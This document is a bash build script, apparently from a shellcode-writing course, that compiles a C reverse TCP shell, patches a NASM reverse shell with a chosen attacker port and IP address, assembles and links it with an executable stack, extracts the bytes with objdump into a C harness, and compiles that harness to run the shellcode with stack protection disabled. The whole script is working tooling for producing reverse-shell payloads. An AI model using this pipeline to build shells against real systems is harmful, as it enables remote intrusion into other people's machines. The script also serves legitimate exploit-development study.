#!/bin/bash

echo '######### GCC #########'
echo '[+] Assembling native c implementation with Gcc ... '
gcc ReverseShellTcp.c -o ReverseShellTcp.c_bin
echo '[+] Done!'
echo

echo '######### NASM #########'

echo '[+] Configuring port '$2
port=`printf %04X $2 |grep -o ..|tac|tr -d '\n'`
sed s/5C11/$port/ <$1.nasm >$1.nasm_port

echo '[+] Configuring address '$3
ipaddr=$3
newip=`printf '%02X' ${ipaddr//./ }`
newiprev=`printf ${newip}|grep -o ..|tac|tr -d '\n'`
sed s/0101017f/$newiprev/ <$1.nasm_port >$1.nasm_ip

rm -rf $1.nasm_port

echo '[+] Assembling with Nasm ... '
nasm -f elf64 -o $1.o $1.nasm_ip
echo '[+] Done!'

# rm -rf $1.nasm_ip

echo '[+] Linking ...'
ld -z execstack -o $1 $1.o
echo '[+] Done!'

# echo '[+] Checking for null bytes ...'
# objdump -d $1 -M intel
# echo '[+] Done!'

echo '[+] Objdump ...'
mycode=`objdump -d ./$1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\x/g'|paste -d '' -s |sed 's/^/"/' | sed 's/$/"/g'`

echo '[+] Assemble shellcode.c ...'
 
echo "#include<stdio.h>" >shellcode.c
echo "#include<string.h>" >>shellcode.c
echo "unsigned char code[] = \\" >>shellcode.c
echo $mycode";" >>shellcode.c
echo "main()" >>shellcode.c
echo "{" >>shellcode.c
echo "printf(\"Shellcode Length:  %d\n\", strlen(code));" >>shellcode.c
echo "  int (*ret)() = (int(*)())code;" >>shellcode.c
echo "  ret();" >>shellcode.c
echo "}" >>shellcode.c
 
echo '[+] Compile shellcode.c'
 
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
 
echo '[+] Done!'